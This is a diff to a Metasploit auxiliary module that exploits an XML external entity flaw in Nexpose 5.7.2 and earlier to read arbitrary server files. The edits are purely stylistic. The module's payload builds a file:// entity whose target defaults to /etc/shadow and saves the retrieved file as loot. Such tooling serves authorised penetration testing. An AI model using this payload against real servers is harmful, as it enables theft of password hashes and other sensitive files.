@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,42 +8,41 @@ require 'msf/core'
 require 'rapid7/nexpose'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name' => 'Nexpose XXE Arbitrary File Read',
-      'Description' => %q{
-        Nexpose v5.7.2 and prior is vulnerable to a XML External Entity attack via a number
-        of vectors. This vulnerability can allow an attacker to a craft special XML that
-        could read arbitrary files from the filesystem. This module exploits the
-        vulnerability via the XML API.
-      },
-      'Author' =>
-        [
-        'Brandon Perry <bperry.volatile[at]gmail.com>', # Initial discovery and Metasploit module
-        'Drazen Popovic <drazen.popvic[at]infigo.hr>',  # Independent discovery, alternate vector
-        'Bojan Zdrnja <bojan.zdrnja[at]infigo.hr>'      # Independently reported
-        ],
-      'License' => MSF_LICENSE,
-      'References'  =>
-        [
-          [ 'URL', 'https://community.rapid7.com/community/nexpose/blog/2013/08/16/r7-vuln-2013-07-24' ]
-        ],
-      'DefaultOptions' => {
-        'SSL' => true
-      }
-    ))
+                      'Name' => 'Nexpose XXE Arbitrary File Read',
+                      'Description' => %q(
+                        Nexpose v5.7.2 and prior is vulnerable to a XML External Entity attack via a number
+                        of vectors. This vulnerability can allow an attacker to a craft special XML that
+                        could read arbitrary files from the filesystem. This module exploits the
+                        vulnerability via the XML API.
+                      ),
+                      'Author' =>
+                        [
+                          'Brandon Perry <bperry.volatile[at]gmail.com>', # Initial discovery and Metasploit module
+                          'Drazen Popovic <drazen.popvic[at]infigo.hr>',  # Independent discovery, alternate vector
+                          'Bojan Zdrnja <bojan.zdrnja[at]infigo.hr>'      # Independently reported
+                        ],
+                      'License' => MSF_LICENSE,
+                      'References' =>
+                        [
+                          [ 'URL', 'https://community.rapid7.com/community/nexpose/blog/2013/08/16/r7-vuln-2013-07-24' ]
+                        ],
+                      'DefaultOptions' => {
+                        'SSL' => true
+                      }))
 
-  register_options(
-    [
-      Opt::RPORT(3780),
-      OptString.new('USERNAME', [true, "The Nexpose user", nil]),
-      OptString.new('PASSWORD', [true, "The Nexpose password", nil]),
-      OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"])
-    ], self.class)
+    register_options(
+      [
+        Opt::RPORT(3780),
+        OptString.new('USERNAME', [true, "The Nexpose user", nil]),
+        OptString.new('PASSWORD', [true, "The Nexpose password", nil]),
+        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"])
+      ], self.class
+    )
   end
 
   def report_cred(opts)
@@ -97,7 +97,7 @@ class MetasploitModule < Msf::Auxiliary
 
     xml = '<!DOCTYPE foo ['
     xml << '<!ELEMENT host ANY>'
-    xml << %Q{<!ENTITY xxe SYSTEM "file://#{datastore['FILEPATH']}">}
+    xml << %(<!ENTITY xxe SYSTEM "file://#{datastore['FILEPATH']}">)
     xml << ']>'
     xml << '<SiteSaveRequest session-id="'
 
@@ -150,8 +150,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    path = store_loot('nexpose.file','text/plain', rhost, doc.root.elements["//host"].first.to_s, "File from Nexpose server #{rhost}")
+    path = store_loot('nexpose.file', 'text/plain', rhost, doc.root.elements["//host"].first.to_s, "File from Nexpose server #{rhost}")
     print_good("File saved to path: " << path)
   end
-
 end
